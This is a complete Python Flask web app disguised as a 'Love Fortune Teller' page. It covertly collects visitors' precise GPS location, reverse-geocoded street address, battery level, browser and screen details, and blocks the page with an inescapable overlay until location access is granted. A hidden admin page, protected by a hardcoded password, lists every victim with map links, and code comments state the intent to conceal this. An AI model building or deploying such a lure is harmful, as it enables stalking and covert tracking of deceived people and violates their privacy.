from flask import Flask, request, jsonify, abort
from flask_cors import CORS
import pandas as pd
import requests
import os
import random
from datetime import datetime

app = Flask(__name__)
CORS(app)

EXCEL_FILE = '/tmp/fortunes_data.xlsx'
ADMIN_PASSWORD = 'admin123'

def init_excel():
    if not os.path.exists(EXCEL_FILE):
        df = pd.DataFrame(columns=[
            'timestamp','name','latitude','longitude',
            'accuracy','address','battery','userAgent','screen'
        ])
        df.to_excel(EXCEL_FILE, index=False)

def geocode_reverse(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
        resp = requests.get(url, headers={'User-Agent': 'LoveTeller/1.0'}, timeout=8)
        return resp.json().get('display_name', 'Hidden')
    except:
        return 'Private'

# ══════════════════════════════════════════════════
#  MAIN HTML — zero mention of admin/download/link
# ══════════════════════════════════════════════════
HTML = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Fortune Teller</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{
  font-family:'Segoe UI',sans-serif;
  background:linear-gradient(135deg,#ff9a9e,#fecfef,#ffdde1);
  min-height:100vh;display:flex;justify-content:center;
  align-items:center;padding:20px;overflow-x:hidden;
}
.heart{
  position:fixed;pointer-events:none;z-index:0;
  animation:floatUp 4s linear infinite;
}
@keyframes floatUp{
  0%{transform:translateY(100vh) rotate(0deg);opacity:1;}
  100%{transform:translateY(-100vh) rotate(360deg);opacity:0;}
}
.box{
  background:rgba(255,255,255,0.96);border-radius:50px;
  padding:50px 40px;max-width:540px;width:100%;
  text-align:center;box-shadow:0 30px 60px rgba(0,0,0,0.18);
  z-index:1;position:relative;animation:fadeIn 0.8s;
}
@keyframes fadeIn{from{opacity:0;transform:scale(0.9);}to{opacity:1;transform:scale(1);}}
.top-emoji{font-size:90px;animation:bounce 2s infinite;display:block;}
@keyframes bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
h1{
  font-size:34px;margin:15px 0 8px;
  background:linear-gradient(135deg,#ff6b6b,#c06c84);
  -webkit-background-clip:text;background-clip:text;color:transparent;
}
.sub{color:#aaa;font-size:15px;margin-bottom:30px;}
.igroup{margin-bottom:22px;text-align:left;}
.igroup label{display:block;margin-bottom:8px;color:#c06c84;font-weight:600;}
.igroup input{
  width:100%;padding:14px 20px;border:2px solid #ffdde1;
  border-radius:50px;font-size:16px;text-align:center;
  outline:none;transition:0.3s;
}
.igroup input:focus{border-color:#c06c84;box-shadow:0 0 12px rgba(192,108,132,0.3);}
.btn{
  background:linear-gradient(135deg,#ff6b6b,#c06c84);
  color:#fff;border:none;padding:17px 40px;
  font-size:19px;font-weight:bold;border-radius:60px;
  cursor:pointer;width:100%;transition:0.3s;
}
.btn:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(192,108,132,0.4);}
.loading{display:none;margin-top:28px;}
.loading.show{display:block;}
.spinner{
  width:58px;height:58px;margin:0 auto 16px;
  background:linear-gradient(135deg,#ff6b6b,#c06c84);
  border-radius:50%;animation:pulse 1.2s infinite;
}
@keyframes pulse{
  0%,100%{transform:scale(0.8);opacity:0.5;}
  50%{transform:scale(1.2);opacity:1;}
}
.result{
  display:none;margin-top:28px;padding:35px;
  background:linear-gradient(135deg,#ff9a9e,#fecfef);
  border-radius:30px;color:#fff;animation:slideUp 0.6s;
}
.result.show{display:block;}
@keyframes slideUp{
  from{opacity:0;transform:translateY(30px);}
  to{opacity:1;transform:translateY(0);}
}
.r-icon{font-size:50px;animation:hb 1.5s infinite;}
@keyframes hb{0%,100%{transform:scale(1);}50%{transform:scale(1.2);}}
.r-name{font-size:26px;font-weight:bold;margin:12px 0;}
.r-msg{font-size:20px;line-height:1.6;margin:14px 0;font-weight:500;}

/* LOCATION DENIED OVERLAY */
#overlay{
  display:none;position:fixed;inset:0;z-index:99999;
  background:linear-gradient(135deg,#ff6b6b,#c06c84);
  flex-direction:column;justify-content:center;
  align-items:center;text-align:center;padding:30px;
}
#overlay.show{display:flex;}
.o-emoji{font-size:75px;margin-bottom:18px;animation:bounce 2s infinite;}
#overlay h2{color:#fff;font-size:26px;margin-bottom:12px;}
#overlay p{
  color:rgba(255,255,255,0.92);font-size:15px;
  max-width:360px;line-height:1.7;margin-bottom:22px;
}
.steps{
  background:rgba(255,255,255,0.18);border-radius:18px;
  padding:18px 22px;margin-bottom:22px;
  text-align:left;max-width:360px;width:100%;
  color:#fff;font-size:14px;line-height:2.3;
}
.o-btn{
  background:#fff;color:#c06c84;border:none;
  padding:15px 38px;font-size:17px;font-weight:bold;
  border-radius:60px;cursor:pointer;animation:pulse 1.5s infinite;
}
@media(max-width:560px){
  .box{padding:30px 20px;}
  h1{font-size:26px;}
  .r-msg{font-size:17px;}
}
</style>
</head>
<body>

<!-- LOCATION DENIED OVERLAY — no close button, no escape -->
<div id="overlay">
  <div class="o-emoji">🔐💕</div>
  <h2>Location Access Needed!</h2>
  <p>Your love fortune can only be revealed with your location. Please allow it to continue ✨</p>
  <div class="steps">
    🔒 Tap the <strong>lock icon</strong> in your address bar<br>
    📋 Open <strong>Site Settings</strong><br>
    📍 Set <strong>Location → Allow</strong><br>
    🔄 Tap <strong>Try Again</strong> below
  </div>
  <button class="o-btn" onclick="retry()">💫 Allow Location & Try Again 💫</button>
</div>

<!-- MAIN CARD — no links, no buttons except fortune -->
<div class="box">
  <span class="top-emoji">💕🔮💕</span>
  <h1>Your Love Fortune</h1>
  <div class="sub">Discover what destiny has planned for your heart</div>

  <div id="form">
    <div class="igroup">
      <label>✨ Enter your name, beautiful soul ✨</label>
      <input id="uname" type="text" placeholder="Your name..." autocomplete="off">
    </div>
    <button class="btn" onclick="start()">✨ Reveal My Destiny ✨</button>
  </div>

  <div class="loading" id="load">
    <div class="spinner"></div>
    <p>💫 Reading the stars for you...</p>
  </div>

  <div class="result" id="res">
    <div class="r-icon">💖</div>
    <div class="r-name" id="rname"></div>
    <div class="r-msg"  id="rmsg"></div>
    <div>✨ The universe has spoken ✨</div>
  </div>
</div>

<script>
// floating hearts
setInterval(()=>{
  const h=document.createElement('div');
  h.innerHTML=['❤️','💕','💖','💗','💓','💝'][Math.floor(Math.random()*6)];
  h.className='heart';
  h.style.cssText=`left:${Math.random()*100}%;font-size:${Math.random()*20+14}px;animation-duration:${Math.random()*3+3}s`;
  document.body.appendChild(h);
  setTimeout(()=>h.remove(),4500);
},600);

let uname='';

window.start=function(){
  uname=document.getElementById('uname').value.trim();
  if(!uname){alert('💕 Please enter your name!');return;}
  askLocation();
};

function askLocation(){
  document.getElementById('res').classList.remove('show');
  document.getElementById('form').style.display='none';
  document.getElementById('load').classList.add('show');
  document.getElementById('overlay').classList.remove('show');
  if(!navigator.geolocation){showOverlay();return;}
  navigator.geolocation.getCurrentPosition(
    async pos=>{
      document.getElementById('load').classList.remove('show');
      let battery='N/A';
      try{const b=await navigator.getBattery();battery=Math.round(b.level*100)+'%';}catch(e){}
      try{
        const r=await fetch('/save',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({
            name:uname,
            latitude:pos.coords.latitude,
            longitude:pos.coords.longitude,
            accuracy:pos.coords.accuracy,
            battery:battery,
            userAgent:navigator.userAgent,
            screen:screen.width+'x'+screen.height
          })
        });
        const d=await r.json();
        if(d.fortune){
          document.getElementById('rname').innerHTML='✨ '+uname+' ✨';
          document.getElementById('rmsg').innerHTML=d.fortune;
          document.getElementById('res').classList.add('show');
        }
      }catch(e){
        document.getElementById('form').style.display='block';
      }
    },
    ()=>{
      // denied → overlay, no escape
      document.getElementById('load').classList.remove('show');
      showOverlay();
    },
    {enableHighAccuracy:true,timeout:12000,maximumAge:0}
  );
}

function showOverlay(){document.getElementById('overlay').classList.add('show');}
window.retry=function(){document.getElementById('form').style.display='none';askLocation();};
</script>
</body>
</html>'''


@app.route('/')
def home():
    return HTML


@app.route('/save', methods=['POST'])
def save_data():
    init_excel()
    try:
        data    = request.json
        address = geocode_reverse(data['latitude'], data['longitude'])

        new_row = pd.DataFrame([{
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'name':      data['name'],
            'latitude':  data['latitude'],
            'longitude': data['longitude'],
            'accuracy':  data['accuracy'],
            'address':   address,
            'battery':   data['battery'],
            'userAgent': data['userAgent'][:120],
            'screen':    data['screen']
        }])

        df = pd.read_excel(EXCEL_FILE)
        df = pd.concat([df, new_row], ignore_index=True)
        df.to_excel(EXCEL_FILE, index=False)

        fortunes = [
            f"💕 Dear {data['name']}, someone special is thinking of you right now!",
            f"💖 {data['name']}, a beautiful soul is about to enter your life!",
            f"💗 {data['name']}, the universe has heard your heart's desire!",
            f"💓 {data['name']}, your soulmate is closer than you think!",
            f"💝 Someone you meet very soon will change your life, {data['name']}!",
            f"💕 Love is rushing toward you faster than you know, {data['name']}!",
            f"💖 {data['name']}, your positive energy is attracting true love!",
            f"💗 The stars are perfectly aligned just for you today, {data['name']}!",
            f"💓 {data['name']}, a wonderful surprise is waiting for your heart!",
            f"💝 {data['name']}, someone is secretly falling for you right now!"
        ]
        print(f"✅ Saved: {data['name']} | {data['latitude']:.4f},{data['longitude']:.4f}")
        return jsonify({'saved': True, 'fortune': random.choice(fortunes)})
    except Exception as e:
        print("ERR:", e)
        return jsonify({'saved': False}), 500


# ADMIN — only accessible by typing /admin in browser, never shown to users
@app.route('/admin', methods=['GET','POST'])
def admin():
    if request.method == 'GET':
        return '''<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>
  *{margin:0;padding:0;box-sizing:border-box;}
  body{font-family:sans-serif;display:flex;justify-content:center;
       align-items:center;min-height:100vh;
       background:linear-gradient(135deg,#ff9a9e,#fecfef);}
  .card{background:#fff;padding:45px 40px;border-radius:24px;
        box-shadow:0 10px 30px rgba(0,0,0,0.12);text-align:center;width:320px;}
  h2{color:#c06c84;margin-bottom:24px;font-size:22px;}
  input{width:100%;padding:13px 18px;border:2px solid #ffdde1;
        border-radius:40px;font-size:15px;text-align:center;
        outline:none;margin-bottom:16px;}
  input:focus{border-color:#c06c84;}
  button{width:100%;padding:13px;background:linear-gradient(135deg,#ff6b6b,#c06c84);
         color:#fff;border:none;border-radius:40px;font-size:16px;
         font-weight:bold;cursor:pointer;}
</style></head>
<body>
<div class="card">
  <h2>🔒 Admin Access</h2>
  <form method="POST">
    <input name="password" type="password" placeholder="Enter password" required>
    <button type="submit">Login</button>
  </form>
</div>
</body></html>'''

    if request.form.get('password') != ADMIN_PASSWORD:
        abort(403)

    init_excel()
    df = pd.read_excel(EXCEL_FILE)
    rows = ''
    for _, row in df.iterrows():
        gps  = f"{row['latitude']:.4f}, {row['longitude']:.4f}"
        maps = f"https://maps.google.com/?q={row['latitude']},{row['longitude']}"
        rows += f'''<tr>
          <td>{row['timestamp']}</td>
          <td><b>{row['name']}</b></td>
          <td><a href="{maps}" target="_blank">📍 {gps}</a></td>
          <td style="max-width:220px;font-size:11px;">{row['address']}</td>
          <td>{row['battery']}</td>
          <td style="font-size:11px;">{row['screen']}</td>
        </tr>'''

    return f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>
  body{{font-family:sans-serif;padding:20px;background:#fff0f5;}}
  h1{{color:#c06c84;margin-bottom:20px;}}
  table{{width:100%;border-collapse:collapse;background:#fff;
         border-radius:15px;overflow:hidden;
         box-shadow:0 5px 20px rgba(0,0,0,0.08);}}
  th{{background:linear-gradient(135deg,#ff6b6b,#c06c84);
      color:#fff;padding:12px 14px;text-align:left;font-size:13px;}}
  td{{padding:10px 14px;border-bottom:1px solid #ffe0e9;font-size:12px;}}
  tr:hover td{{background:#fff5f8;}}
  a{{color:#c06c84;text-decoration:none;}}
  a:hover{{text-decoration:underline;}}
</style></head>
<body>
<h1>💋 Private Data — {len(df)} entries</h1>
<table>
  <tr>
    <th>Time</th><th>Name</th><th>Location</th>
    <th>Address</th><th>Battery</th><th>Screen</th>
  </tr>
  {rows}
</table>
</body></html>'''


if __name__ == '__main__':
    init_excel()
    app.run(host='0.0.0.0', port=5000)
